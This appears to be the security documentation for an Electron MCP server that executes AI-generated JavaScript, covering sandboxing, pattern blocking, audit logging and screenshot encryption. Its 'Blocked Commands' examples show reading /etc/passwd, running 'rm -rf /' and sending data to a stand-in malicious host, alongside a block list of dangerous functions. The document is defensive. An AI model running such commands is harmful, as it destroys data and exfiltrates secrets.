# Security Implementation

This document describes the security measures implemented in the Electron MCP Server to ensure safe execution of AI-generated commands.

## 🛡️ Security Features

### 1. Code Execution Isolation
- **Sandboxed Environment**: All JavaScript code execution is isolated using a secure Node.js subprocess
- **Resource Limits**: 
  - Maximum execution time: 5 seconds
  - Memory limit: 50MB
  - No filesystem access unless explicitly needed
  - No network access by default
- **Global Restriction**: Dangerous globals like `process`, `require`, `fs` are disabled in the sandbox

### 2. Input Validation & Sanitization
- **Static Analysis**: Commands are analyzed for dangerous patterns before execution
- **Blacklisted Functions**: Blocks dangerous functions like `eval`, `Function`, `require`, etc.
- **Pattern Detection**: Detects potential XSS, injection, and obfuscation attempts
- **Risk Assessment**: All commands are assigned a risk level (low/medium/high/critical)
- **Command Sanitization**: Dangerous content is escaped or removed

### 3. Comprehensive Audit Logging
- **Encrypted Logs**: All execution attempts are logged with encrypted sensitive data
- **Metadata Tracking**: Logs include timestamps, risk levels, execution times, and outcomes
- **Security Events**: Failed attempts and blocked commands are specially flagged
- **Performance Metrics**: Track execution patterns for anomaly detection

### 4. Secure Screenshot Handling
- **Encryption**: Screenshot data is encrypted before storage
- **User Notification**: Clear logging when screenshots are taken
- **Data Minimization**: Screenshots are only stored temporarily
- **Secure Transmission**: Base64 data is transmitted over secure channels

## 🚨 Blocked Operations

The following operations are automatically blocked for security:

### Critical Risk Operations
- Direct `eval()` or `Function()` calls
- File system access (`fs`, `readFile`, `writeFile`)
- Process control (`spawn`, `exec`, `kill`)
- Network requests in user code
- Module loading (`require`, `import`)
- Global object manipulation

### High Risk Patterns
- Excessive string concatenation (potential obfuscation)
- Encoded content (`\\x`, `\\u` sequences)
- Script injection patterns
- Cross-site scripting attempts

## ⚙️ Configuration

Security settings can be configured via environment variables:

```bash
# Encryption
SCREENSHOT_ENCRYPTION_KEY=your-secret-key-here
```

## 📊 Security Metrics

The system tracks various security metrics:

- **Total Requests**: Number of commands processed
- **Blocked Requests**: Commands blocked due to security concerns
- **Risk Distribution**: Breakdown by risk levels
- **Average Execution Time**: Performance monitoring
- **Error Rate**: Failed execution percentage

## 🔍 Example Security Validations

### ✅ Safe Commands
```javascript
// UI interactions
document.querySelector('#button').click()

// Data extraction
document.getElementById('title').innerText

// Simple DOM manipulation
element.style.display = 'none'
```

### ❌ Blocked Commands
```javascript
// File system access
require('fs').readFileSync('/etc/passwd')

// Code execution
eval('malicious code')

// Process control
require('child_process').exec('rm -rf /')

// Network access
fetch('http://malicious-site.com/steal-data')
```

## 🛠️ Development Guidelines

When extending the MCP server:

1. **Always validate input** before processing
2. **Log security events** for audit trails
3. **Test with malicious inputs** to verify security
4. **Follow principle of least privilege**
5. **Keep security dependencies updated**

## 📝 Security Audit Trail

All security events are logged to `logs/security/` with the following information:

- Timestamp and session ID
- Command content (encrypted if sensitive)
- Risk assessment results
- Execution outcome
- User context (if available)
- Performance metrics

**Note**: This security implementation provides strong protection against common threats, but security is an ongoing process. Regular security audits and updates are recommended.
